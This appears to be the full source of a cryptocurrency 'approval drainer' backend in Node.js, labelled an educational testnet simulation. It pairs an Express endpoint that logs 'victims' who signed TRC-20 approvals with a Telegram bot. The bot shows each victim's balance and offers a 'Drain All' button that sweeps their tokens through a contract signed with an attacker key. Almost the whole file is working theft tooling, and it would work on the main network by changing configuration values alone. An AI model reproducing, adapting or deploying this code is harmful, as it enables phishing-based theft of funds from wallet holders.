require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Telegraf } = require('telegraf');
const { TronWeb } = require('tronweb');

const app = express();
app.use(cors());
app.use(express.json());

// ---- TronWeb (Shasta testnet) ----
const tronWeb = new TronWeb({
  fullHost: 'https://api.shasta.trongrid.io',
  privateKey: process.env.ATTACKER_PRIVATE_KEY
});

const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
const SWEEPER_ADDRESS = process.env.SWEEPER_ADDRESS;
const DECIMALS = 6;

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const victims = [];
const fmt = (n) => Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

async function readBalance(addr) {
  try {
    const c = await tronWeb.contract().at(TOKEN_ADDRESS);
    const raw = await c.balanceOf(addr).call();
    return Number(raw.toString()) / 10 ** DECIMALS;
  } catch (e) {
    console.error('Balance read error:', e.message);
    return 0;
  }
}

// ================= TELEGRAM COMMANDS =================
bot.start((ctx) => {
  const message =
    `🤖 *QR Drainer Bot - Educational PoC*\n\n` +
    `Monitors TRC-20 approval attacks on the Shasta testnet.\n\n` +
    `1. Victim connects wallet to the site\n` +
    `2. Victim clicks "Claim" (signs approve)\n` +
    `3. You get an alert here with their balance\n` +
    `4. Tap "Drain All" to execute\n\n` +
    `⚠️ *SIMULATION ONLY* - No real funds.`;
  const keyboard = {
    inline_keyboard: [
      [{ text: '🧪 Test Bot', callback_data: 'cmd_test' }, { text: '📊 Status', callback_data: 'cmd_status' }],
      [{ text: '📖 Help', callback_data: 'cmd_help' }]
    ]
  };
  ctx.reply(message, { parse_mode: 'Markdown', reply_markup: keyboard });
  console.log('[BOT] /start');
});

bot.command('test', (ctx) => ctx.reply('🔧 *Telegram test — SIMULATION*\nBackend wired up. No real funds.', { parse_mode: 'Markdown' }));
bot.action('cmd_test', (ctx) => ctx.reply('🔧 *Telegram test — SIMULATION*\nBackend wired up. No real funds.', { parse_mode: 'Markdown' }));

bot.command('status', (ctx) => {
  if (!victims.length) return ctx.reply('📊 No victims yet. Waiting for approvals...');
  let msg = `📊 *Victims (${victims.length})*\n\n`;
  victims.forEach((v, i) => { msg += `${i + 1}. \`${v.address}\` - ${v.status}\n`; });
  ctx.reply(msg, { parse_mode: 'Markdown' });
});
bot.action('cmd_status', (ctx) => {
  if (!victims.length) return ctx.reply('📊 No victims yet. Waiting for approvals...');
  let msg = `📊 *Victims (${victims.length})*\n\n`;
  victims.forEach((v, i) => { msg += `${i + 1}. \`${v.address}\` - ${v.status}\n`; });
  ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.help((ctx) => ctx.reply('📖 *Help*\n/start - menu\n/test - connectivity\n/status - victims\n\n⚠️ SIMULATION ONLY.', { parse_mode: 'Markdown' }));
bot.action('cmd_help', (ctx) => ctx.reply('📖 *Help*\n/start - menu\n/test - connectivity\n/status - victims\n\n⚠️ SIMULATION ONLY.', { parse_mode: 'Markdown' }));

// ================= API: victim approved =================
app.post('/api/alert', async (req, res) => {
  const { victimAddress, txHash } = req.body;
  if (!victims.find(v => v.address === victimAddress)) {
    victims.push({ address: victimAddress, status: 'APPROVED', time: Date.now() });
  }
  console.log(`[ALERT] Victim Approved: ${victimAddress}`);
  const bal = await readBalance(victimAddress);

  const message =
    `🚨 *APPROVAL DETECTED* 🚨\n\n` +
    `👤 Victim: \`${victimAddress}\`\n` +
    `💰 Balance: **${fmt(bal)} mUSDT**\n` +
    `🔗 [approve tx](https://shasta.tronscan.org/#/transaction/${txHash})\n\n` +
    `Tap below to inspect, then drain.`;
  const keyboard = {
    inline_keyboard: [[
      { text: '📊 Show Balance', callback_data: `bal_${victimAddress}` },
      { text: '🕷️ Drain All', callback_data: `sweep_${victimAddress}` }
    ]]
  };
  try {
    await bot.telegram.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown', reply_markup: keyboard });
    res.json({ success: true });
  } catch (err) {
    console.error('Telegram error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// ================= Show Balance =================
bot.action(/bal_(.+)/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery('Reading...');
  try {
    const bal = await readBalance(addr);
    const time = new Date().toLocaleTimeString();
    await ctx.editMessageText(`📊 *Balance check (at ${time})*\n👤 \`${addr}\`\n💰 **${fmt(bal)} mUSDT**`, { parse_mode: 'Markdown' });
  } catch (e) {
    if (e.description && e.description.includes('message is not modified')) return;
    await ctx.editMessageText(`❌ Read failed: ${e.message}`);
  }
});

// ================= Drain All (FIXED) =================
bot.action(/sweep_(.+)/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery('Initiating transferFrom...');
  await ctx.editMessageText(`🕷️ *Sweeping from* \`${addr}\`...`, { parse_mode: 'Markdown' });
  try {
    const token = await tronWeb.contract().at(TOKEN_ADDRESS);
    const sw = await tronWeb.contract().at(SWEEPER_ADDRESS);

    const bal = BigInt((await token.balanceOf(addr).call()).toString());
    const allow = BigInt((await token.allowance(addr, SWEEPER_ADDRESS).call()).toString());
    const amount = bal < allow ? bal : allow;
    console.log(`[SWEEP] ${addr} balance=${bal} allowance=${allow} amount=${amount}`);

    if (amount === 0n) {
      await ctx.editMessageText(
        `❌ *Nothing to sweep.*\nUSDT balance=${bal}\nAllowance=${allow}\nFund the victim with mock USDT AND have them sign approve first.`,
        { parse_mode: 'Markdown' }
      );
      return;
    }

    let tx;
    try { tx = await sw.sweepTokens(TOKEN_ADDRESS, addr, amount.toString()).send({ feeLimit: 100000000 }); }
    catch (e1) {
      try { tx = await sw.sweepTokens(TOKEN_ADDRESS, addr).send({ feeLimit: 100000000 }); }
      catch (e2) { tx = await sw.sweepAll(TOKEN_ADDRESS, addr).send({ feeLimit: 100000000 }); }
    }

    let info = await tronWeb.trx.getTransactionInfo(tx);
    let tries = 0;
    while ((!info || !info.id) && tries < 15) { await new Promise(r => setTimeout(r, 2000)); info = await tronWeb.trx.getTransactionInfo(tx); tries++; }

    if (info && info.id) {
      const left = Number((await token.balanceOf(addr).call()).toString()) / 10 ** DECIMALS;
      await ctx.editMessageText(
        `✅ *DRAINED*\n👤 \`${addr}\`\n💸 [view tx](https://shasta.tronscan.org/#/transaction/${tx})\n💰 Remaining: **${fmt(left)} mUSDT**`,
        { parse_mode: 'Markdown' }
      );
      const v = victims.find(x => x.address === addr); if (v) v.status = 'DRAINED';
    } else {
      await ctx.editMessageText(`❌ Not confirmed in time. Check Tronscan for ${tx}`);
    }
  } catch (e) {
    console.error('Sweep error:', e);
    await ctx.editMessageText(`❌ *Sweep failed*\n${e.message || e}`, { parse_mode: 'Markdown' });
  }
});

// ================= Admin endpoints =================
app.get('/api/victims', (req, res) => res.json(victims));
app.post('/api/drained', (req, res) => {
  const v = victims.find(x => x.address === req.body.address);
  if (v) { v.status = 'DRAINED'; v.drainTx = req.body.txHash; }
  res.json({ success: true });
});

// ================= Start =================
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`\n🛡️ Backend running on port ${PORT}`);
  console.log(`🤖 Telegram bot initialized.`);
  console.log(`📡 Listening for frontend alerts...\n`);
});

bot.launch().then(() => {
  console.log('✅ Telegram bot is now listening for commands.');
}).catch((err) => {
  console.error('❌ Bot launch failed:', err.message);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));